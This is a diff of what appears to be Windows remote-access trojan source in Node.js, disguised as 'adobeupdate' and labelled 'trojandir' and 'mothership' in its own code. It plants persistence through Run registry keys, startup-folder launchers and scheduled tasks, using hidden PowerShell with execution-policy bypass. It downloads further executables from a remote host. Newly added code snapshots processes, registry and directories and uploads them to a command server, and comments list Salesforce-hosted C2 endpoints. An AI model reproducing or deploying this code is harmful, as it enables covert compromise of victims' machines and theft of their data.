@@ -1,4 +1,4 @@
-// debugger;
+debugger;
 
 // https://github.com/gauravmehla/Javascript-bookshelf/blob/master/O'Reilly%20-%20You%20Don't%20Know%20JS.%20this%20%26%20Object%20Prototypes.pdf
 // https://www.tutorialspoint.com/compilers/online-nodejs-compiler.htm
@@ -8,7 +8,7 @@
 //
 // https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/ping.php
 // https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/retrieve.php
-// 
+//
 
 // https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce.com/
 // storagevault941@agentforce.com
@@ -56,7 +56,6 @@
 //              CleanUp
 //              SelfDestruct
 
-
 const path = require("path");
 module.paths.push(
     path.resolve(
@@ -86,31 +85,35 @@ for (let token of process.argv) {
 // TODO: put in time parameter
 var taskconfig = {
     tasks: [
-        { 'name':'IdleTask', 'enabled': false },
-        { 'name':'RepTask', 'enabled': false },
-        { 'name':'TimeTask', 'enabled': false },
-        { 'name':'DailyTask', 'enabled':false }
+        { name: "IdleTask", enabled: false },
+        { name: "RepTask", enabled: false },
+        { name: "TimeTask", enabled: false },
+        { name: "DailyTask", enabled: false },
     ],
 
     getTaskTime(taskname) {
-        if ( taskname.includes("RepTask") || taskname.includes("TimeTask") )
+        if (taskname.includes("RepTask") || taskname.includes("TimeTask"))
             return "1";
 
         return "5";
     },
 
     getTaskXMLFunc(taskname) {
-        taskname = taskname.startsWith("adobeupdate_") ? taskname.replace("adobeupdate_","") : taskname;
+        taskname = taskname.startsWith("adobeupdate_")
+            ? taskname.replace("adobeupdate_", "")
+            : taskname;
         return this.taskxmlfuncs[taskname];
     },
 
     get tasknames() {
         let arr = Object.keys(this.taskxmlfuncs);
 
-        for ( let i = 0; i<arr.length; i++) {
+        for (let i = 0; i < arr.length; i++) {
             let namestr = arr[i];
 
-            arr[i] = (namestr.startsWith('adobeupdate_') ? '' : 'adobeupdate_') + namestr;
+            arr[i] =
+                (namestr.startsWith("adobeupdate_") ? "" : "adobeupdate_") +
+                namestr;
         }
 
         return arr;
@@ -125,13 +128,18 @@ var taskconfig = {
 };
 
 var regstartupconfig = {
-
-    startup_name: '', 
-    startup_value: '',
+    startup_name: "",
+    startup_value: "",
 
     get name_value_str() {
-        return `$Name = "${this.startup_name}"
-                $Value = "${this.startup_value}"` + '\r\n';
+        return (
+            `$Name = "${this.startup_name}"
+                $Value = "${this.startup_value}"` + "\r\n"
+        );
+    },
+
+    get reg_paths() {
+        return [this.hkcu_path, this.hklm_path, this.hku_path];
     },
 
     get new_item_str() {
@@ -139,6 +147,7 @@ var regstartupconfig = {
     },
 
     get hku_path() {
+        // TODO get UserSID using powershell
         return "HKU:\\S-1-5-21-3405768669-439801778-3591577900-24511\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
     },
 
@@ -151,29 +160,47 @@ var regstartupconfig = {
     },
 
     get startup_hklm_script() {
-        return this.name_value_str + '\r\n' + `$RegistryPath = "${this.hklm_path}"` + '\r\n' + this.new_item_str;
+        return (
+            this.name_value_str +
+            "\r\n" +
+            `$RegistryPath = "${this.hklm_path}"` +
+            "\r\n" +
+            this.new_item_str
+        );
     },
 
     get startup_hkcu_script() {
-        return this.name_value_str + '\r\n' + `$RegistryPath = "${this.hkcu_path}"` + '\r\n' + this.new_item_str;
+        return (
+            this.name_value_str +
+            "\r\n" +
+            `$RegistryPath = "${this.hkcu_path}"` +
+            "\r\n" +
+            this.new_item_str
+        );
     },
 
     get startup_hku_script() {
         let new_drive_tag = `New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS`;
-        return new_drive_tag + '\r\n' + this.name_value_str + '\r\n' + `$RegistryPath = "${this.hku_path}"` + '\r\n' + this.new_item_str;
-    }
+        return (
+            new_drive_tag +
+            "\r\n" +
+            this.name_value_str +
+            "\r\n" +
+            `$RegistryPath = "${this.hku_path}"` +
+            "\r\n" +
+            this.new_item_str
+        );
+    },
 };
 
 var startupfolderconfig = {
-    
     get launcher_fname() {
-        return 'adobeupdate.cmd';
+        return "adobeupdate.cmd";
     },
 
     getFolder(foldername) {
-        this.folders.forEach( (folder) => {
-            if ( folder.name == foldername )
-                return folder;
+        this.folders.forEach((folder) => {
+            if (folder.name == foldername) return folder;
         });
     },
 
@@ -182,62 +209,77 @@ var startupfolderconfig = {
     },
 
     getFolderPath(foldername) {
-
         for (const folder of this.folders) {
-            if ( folder.name == foldername ) {
+            if (folder.name == foldername) {
                 return folder.folderpath;
             }
         }
-
     },
 
     getLauncherScript(foldername) {
-        let pre = '@echo off' + '\r\n';
-        return pre + `start "" /min wmic process call create "conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} ${foldername}"`;
+        let pre = "@echo off" + "\r\n";
+        return (
+            pre +
+            `start "" /min wmic process call create "conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} ${foldername}"`
+        );
     },
 
     get foldernames() {
         let tfoldernames = [];
 
-        this.folders.forEach( (folder) => {
-            tfoldernames.push( folder.name );
+        this.folders.forEach((folder) => {
+            tfoldernames.push(folder.name);
         });
 
         return tfoldernames;
     },
 
+    get folderpaths() {
+        let tfolderpaths = [];
+
+        this.folders.forEach((folder) => {
+            tfolderpaths.push(folder.folderpath);
+        });
+
+        return tfolderpaths;
+    },
+
     folders: [
-        { 
-            enabled: true, 
-            name: 'startup_allusers',
-            folderpath: 'C:\\Users\\All Users\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
+        {
+            enabled: true,
+            name: "startup_allusers",
+            folderpath:
+                "C:\\Users\\All Users\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
         },
-        
-        { 
-            enabled: true, 
-            name: 'startup_profile',
-            folderpath: 'C:\\ProgramData\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+
+        {
+            enabled: true,
+            name: "startup_profile",
+            folderpath:
+                "C:\\ProgramData\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
         },
-        
-        { 
-            enabled: true, 
-            name:'startup_adult2022', 
-            folderpath: 'C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-        }
+
+        {
+            enabled: true,
+            name: "startup_adult2022",
+            folderpath:
+                "C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+        },
     ],
 };
 
 var systemconfig = {
     get launch_script_fname() {
-        return systemstate.istpl ? 'tpl_launch.cmd' : 'launch.cmd';
+        return systemstate.istpl ? "tpl_launch.cmd" : "launch.cmd";
     },
 
     get launch_script_fpath() {
         return path.join(systemstate.trojandir, this.launch_script_fname);
-    }
+    },
 };
 
 // TODO move over static configurations to systemconfig
+// TODO jobcode --> put in logic to grab jobcode from CmdConfig
 var systemstate = {
     staticdelay: 30,
 
@@ -247,10 +289,12 @@ var systemstate = {
     get istpl() {
         let machineprefix = this.machinename.toLowerCase().substring(0, 5);
 
-        if ( this.username == "ADULT2022" )
-            return true;
+        if (this.username == "ADULT2022") return true;
 
-        if ( machineprefix == "RLPCP".toLowerCase() || machineprefix == "SJPCP".toLowerCase() ) {
+        if (
+            machineprefix == "RLPCP".toLowerCase() ||
+            machineprefix == "SJPCP".toLowerCase()
+        ) {
             return true;
         }
 
@@ -576,6 +620,17 @@ class CmdConfig {
         return this.#__parentcmdconfig;
     }
 
+    get config() {
+        if (process_argv.length <= 3) {
+            return null;
+        }
+
+        let cmdconfig_json = readTag(process_argv[3]);
+        let cmdconfig_obj = JSON.parse(cmdconfig_json);
+
+        return cmdconfig_obj;
+    }
+
     get childprocess() {
         return this.#__childprocess;
     }
@@ -649,6 +704,8 @@ class CmdConfig {
         install_python: install_python,
         install_node: install_node,
         cleanup: cleanup,
+
+        getsystemoverview: getsystemoverview,
     };
 
     get dynamicdelay() {
@@ -1021,6 +1078,28 @@ class PubnubRelay {
 }
 
 // ---
+
+function getusersid() {
+    return new Promise((resolve, reject) => {
+        const psCommand = `(Get-LocalUser -Name "${systemstate.username}").SID.Value`;
+
+        exec(
+            `powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "${psCommand}"`,
+            { maxBuffer: 1024 * 1024 * 10 },
+            (error, stdout, stderr) => {
+                if (error) {
+                    reject(error);
+                }
+
+                if (stderr) {
+                    resolve(stderr);
+                }
+
+                resolve(stdout);
+            }
+        );
+    });
+}
 
 function isChildHealthy(childProcess) {
     return (
@@ -1408,6 +1487,64 @@ function isValidHttpUrl(string) {
     } catch (error) {
         return false;
     }
+}
+
+// TODO -- put in filename param
+async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
+    logmsg("starting");
+
+    const fileBlob = await fs.openAsBlob(filepath);
+
+    inputHeaders = inputHeaders ?? {};
+    inputHeaders["Content-Type"] = "application/octet-stream";
+
+    const url = new URL(baseUrl);
+
+    logmsg(`baseUrl: ${baseUrl} filepath: ${filepath}`);
+
+    if (isValidDict(params)) {
+        Object.keys(params).forEach((key) => {
+            url.searchParams.append(key, params[key]);
+        });
+    }
+
+    logmsg("request url: " + url.toString());
+
+    // anchor
+    const request = new Request(url.toString(), {
+        method: "PUT",
+        body: fileBlob,
+        headers: inputHeaders,
+        duplex: "half",
+    });
+
+    const response = await fetch(request);
+
+    request.headers.forEach((value, key) => {
+        logmsg(`${key}: ${value}`);
+    });
+
+    const textData = await response.text();
+
+    let headersOut = {};
+
+    for (const [key, value] of response.headers.entries()) {
+        if (!isNullOrWhitespace(key) && !isNullOrWhitespace(value)) {
+            logmsg("response headers key=" + key + " value=" + value);
+            headersOut[key] = value;
+        }
+    }
+
+    let responseOut = {
+        status: response.status,
+        statusText: response.statusText,
+        headers: headersOut,
+        responseText: textData,
+    };
+
+    logmsg("response status=" + response.status);
+
+    return responseOut;
 }
 
 /*
@@ -1837,7 +1974,7 @@ function processClientJob(rawtext) {
 }
 
 async function ping_loop() {
-    let baseUrl = systemstate.mothership + "/ow/ping.php";
+    let baseUrl = systemstate.mothership + "/ow/ping.php"; // TODO move over to systemstate
 
     let inputHeaders = null;
     let params = systemstate.statekvp;
@@ -2810,12 +2947,12 @@ async function reschedule() {
 
     for (let i = 0; i < tasknames.length; i++) {
         let taskname = tasknames[i];
-        
+
         logmsg(`checking if task exists ${taskname}`);
         let taskexist = await getTaskExists(taskname);
-        
-        if ( taskexist ) {
-            logmsg(`task ${taskname} exists`); 
+
+        if (taskexist) {
+            logmsg(`task ${taskname} exists`);
             continue;
         }
 
@@ -2825,31 +2962,44 @@ async function reschedule() {
 }
 
 async function exec_ps_cmd(psScript) {
-
     return new Promise((resolve, reject) => {
+        const child = spawn(
+            "powershell.exe",
+            [
+                "-NoProfile",
+                "-ExecutionPolicy",
+                "Bypass",
+                "-NonInteractive",
+                "-WindowStyle",
+                "Hidden",
+                "-Command",
+                "-",
+            ],
+            { stdio: ["pipe", "pipe", "pipe"] }
+        );
 
-        const child = spawn('powershell.exe', 
-            ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', '-'], 
-            { stdio: ['pipe', 'pipe', 'pipe'] });
+        let stdoutData = "";
+        let stderrData = "";
 
-        let stdoutData = '';
-        let stderrData = '';
-
-        child.stdout.on('data', (chunk) => {
+        child.stdout.on("data", (chunk) => {
             stdoutData += chunk.toString();
         });
 
-        child.stderr.on('data', (chunk) => {
+        child.stderr.on("data", (chunk) => {
             stderrData += chunk.toString();
         });
 
-        child.on('error', (err) => {
+        child.on("error", (err) => {
             reject(err);
         });
 
-        child.on('close', (code) => {
+        child.on("close", (code) => {
             if (code !== 0) {
-                reject(new Error(`PowerShell exited with code ${code}: ${stderrData}`));
+                reject(
+                    new Error(
+                        `PowerShell exited with code ${code}: ${stderrData}`
+                    )
+                );
             } else {
                 resolve(stdoutData.trim());
             }
@@ -2861,12 +3011,12 @@ async function exec_ps_cmd(psScript) {
 }
 
 async function penetrate_reg() {
-    regstartupconfig.startup_name = 'adobeupdate_startup';
+    regstartupconfig.startup_name = "adobeupdate_startup";
 
     regstartupconfig.startup_value = `conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} startup_hklm`;
     await exec_ps_cmd(regstartupconfig.startup_hklm_script);
 
-    regstartupconfig.startup_value = `conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} startup_hkcu`; 
+    regstartupconfig.startup_value = `conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} startup_hkcu`;
     await exec_ps_cmd(regstartupconfig.startup_hkcu_script);
 
     regstartupconfig.startup_value = `conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} startup_hku`;
@@ -2876,9 +3026,8 @@ async function penetrate_reg() {
 }
 
 async function download_launch_script() {
-
     let filename = systemconfig.launch_script_fname;
-    
+
     let baseUrl = systemstate.mothershipassets + "/" + filename;
     let localpath = path.join(systemstate.trojandir, filename);
 
@@ -2896,14 +3045,12 @@ async function download_launch_script() {
 
     const stats = fs.statSync(localpath);
     logmsg(`${localpath} -- File size: ${stats.size} bytes`);
-
 }
 
 function penetrate_folders() {
-
     let foldernames = startupfolderconfig.foldernames;
 
-    for ( let i = 0; i<foldernames.length; i++) {
+    for (let i = 0; i < foldernames.length; i++) {
         let foldername = foldernames[i];
         let fpath = startupfolderconfig.getScriptPath(foldername);
         let script_txt = startupfolderconfig.getLauncherScript(foldername);
@@ -2911,13 +3058,12 @@ function penetrate_folders() {
         logmsg(`writing launch script to ${fpath}`);
         fs.writeFileSync(fpath, script_txt, "utf8");
     }
-
 }
 
 async function penetrate() {
     logmsg("starting");
-    
-    if ( ! fileExists(systemconfig.launch_script_fpath) ) {
+
+    if (!fileExists(systemconfig.launch_script_fpath)) {
         await download_launch_script();
     }
 
@@ -2925,7 +3071,7 @@ async function penetrate() {
     await penetrate_reg();
     await penetrate_folders();
 
-    // TODO await cleanup() 
+    // TODO await cleanup()
     // check if trojandir needs cleanup, if so remove log files, etc.
 
     logmsg("finished");
@@ -2959,16 +3105,14 @@ async function invoke_exe(
         try {
             child?.stdout?.on("data", (data) => {
                 let text = data.toString();
-                
-                if (stdoutfunc) 
-                    stdoutfunc(text);
+
+                if (stdoutfunc) stdoutfunc(text);
             });
 
             child?.stderr?.on("data", (data) => {
                 let text = data.toString();
 
-                if (stderrfunc) 
-                    stderrfunc(text);
+                if (stderrfunc) stderrfunc(text);
             });
 
             child?.on("close", (code) => {
@@ -3489,7 +3633,8 @@ async function retrieve() {
         "gunite.exe",
         "pcmon.dll",
         "pcmon.exe",
-        "pslist.exe"    ];
+        "pslist.exe",
+    ];
 
     for (let i = 0; i < assets.length; i++) {
         let fname = assets[i];
@@ -3497,7 +3642,7 @@ async function retrieve() {
 
         let baseUrl = systemstate.mothershipassets + "/" + fname;
 
-        if ( fileExists(localpath) ) {
+        if (fileExists(localpath)) {
             logmsg(`assets exists ${localpath} -- skipping `);
             continue;
         }
@@ -3733,23 +3878,21 @@ async function pspcmon() {
 
 async function getDirInfo(dirPath) {
     try {
-        const files = await fs.readdir(dirPath);
+        const files = await fs.readdirSync(dirPath);
 
         const fileDetails = await Promise.all(
-
             files.map(async (file) => {
                 const filePath = path.join(dirPath, file);
-                const stats = await fs.stat(filePath);
+                const stats = await fs.statSync(filePath);
 
                 return {
                     filepath: filePath,
                     filename: file,
                     sizeBytes: stats.size,
                     modifiedDate: stats.mtime,
-                    isDirectory: stats.isDirectory()
+                    isDirectory: stats.isDirectory(),
                 };
-
-            }) 
+            })
         );
 
         return fileDetails;
@@ -3766,20 +3909,92 @@ async function getscreencapture() {
     let runningcmd = systemstate.cmdconfig;
 }
 
+// TODO
+function query_reg(reg_path) {
+    // regstartupconfig.reg_paths
+
+    return new Promise((resolve, reject) => {
+        const reg_query = `reg query ${reg_path} /s /z`;
+
+        // reg query HKU\S-1-5-21-435801507-4188035712-3236683676-1001\SOFTWARE\Microsoft\Windows\CurrentVersion /s /z
+
+        exec(reg_query, (error, stdout, stderr) => {
+            if (error) {
+                reject(error);
+            }
+
+            if (stderr) {
+                resolve(stderr);
+            }
+
+            resolve(stdout);
+        });
+    });
+}
+
 // TODO -- we need upload mechanism -- upload.php
 async function getsystemoverview() {
     logmsg("starting");
 
     let runningcmd = systemstate.cmdconfig;
+    let config = runningcmd.config;
+
+    if (!config) {
+        throw new Error("cmd must be launched with job config set");
+    }
+
+    let jobcode = config?.jobcode ?? "99998888";
 
     let dir_snapshot = await getDirInfo(systemstate.trojandir);
-    let task_snapshot= await getTasks();
+    let task_snapshot = await getTasks();
     let process_snapshot = await getProcessList_wmic();
 
-    // execute reg query on select registry locations
-    // stat startup folder paths
+    let user_sid = await getusersid();
+    let reg_snapshot = null;
 
-    logmsg("finished");
+    if (!isNullOrWhitespace(user_sid)) {
+        user_sid = user_sid.trim();
+
+        let reg_path = `HKU\\${user_sid}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`;
+
+        reg_snapshot = await query_reg(reg_path);
+    }
+
+    let startupdir_snapshots = await Promise.all(
+        startupfolderconfig.folderpaths.map(async (folderpath) => {
+            await getDirInfo(folderpath);
+        })
+    );
+
+    let outjson = {
+        dir_snapshot: dir_snapshot,
+        task_snapshot: task_snapshot,
+        process_snapshot: process_snapshot,
+        startupdir_snapshots: startupdir_snapshots,
+        reg_snapshot: reg_snapshot,
+    };
+
+    let outjson_str = JSON.stringify(outjson);
+
+    let localfpath = path.join(
+        systemstate.trojandir,
+        runningcmd.cmdname + "_out_" + getTimestamp() + ".json"
+    );
+
+    fs.writeFileSync(localfpath, outjson_str, "utf-8");
+
+    let baseUrl = systemstate.mothership + "/ow/upload.php";
+    systemstate.statekvp["jobcode"] = config.jobcode;
+    let response = await makePUTRequest(
+        baseUrl,
+        systemstate.statekvp,
+        null,
+        localfpath
+    ); // anchor
+
+    logmsg(JSON.stringify(response));
+
+    process.exit(0);
 }
 
 // ---
@@ -3866,7 +4081,7 @@ async function createTask(taskname) {
         throw new Error(`${taskname} is not supported`);
     }
 
-    let taskxmlstrfunc = taskconfig.getTaskXMLFunc(taskname); // anchor
+    let taskxmlstrfunc = taskconfig.getTaskXMLFunc(taskname);
     let tasktime = taskconfig.getTaskTime(taskname);
 
     let pexe = "conhost.exe";
@@ -3893,29 +4108,39 @@ async function createTask(taskname) {
 
 async function exec_schtasks(taskxmlpath, taskname) {
     // schtasks /create /XML "taskxmlpath" /tn "taskname" /F
-    let ret = await invoke_exe("schtasks", [
-        "/create",
-        "/XML",
-        '"' + taskxmlpath + '"',
-        "/tn",
-        '"' + taskname + '"',
-        "/F",
-    ], null, 
-    (text) => { logmsg(text); }, 
-    (text) => { logmsg(text); });
+    let ret = await invoke_exe(
+        "schtasks",
+        [
+            "/create",
+            "/XML",
+            '"' + taskxmlpath + '"',
+            "/tn",
+            '"' + taskname + '"',
+            "/F",
+        ],
+        null,
+        (text) => {
+            logmsg(text);
+        },
+        (text) => {
+            logmsg(text);
+        }
+    );
 }
 
 async function getTaskExists(taskname) {
     let resultdict = null;
-    
+
     try {
         resultdict = await getTaskDetail(taskname);
     } catch (err) {
-        logmsg("task detail returned empty result -- assuming task does not exist");
+        logmsg(
+            "task detail returned empty result -- assuming task does not exist"
+        );
         return false;
     }
 
-    if ( resultdict && resultdict['TaskName'] ) {
+    if (resultdict && resultdict["TaskName"]) {
         return true;
     }
 
@@ -3940,7 +4165,9 @@ async function getTaskDetail(taskname) {
     );
 
     if (isNullOrWhitespace(taskstr)) {
-        throw new Error(`could not generate task detail listing for ${taskname}`);
+        throw new Error(
+            `could not generate task detail listing for ${taskname}`
+        );
     }
 
     const lines = taskstr.split(/\r?\n/);
@@ -4192,7 +4419,6 @@ function getDailyTaskXMLStr(
 
     return taskxmlstr;
 }
-
 
 // ---
 
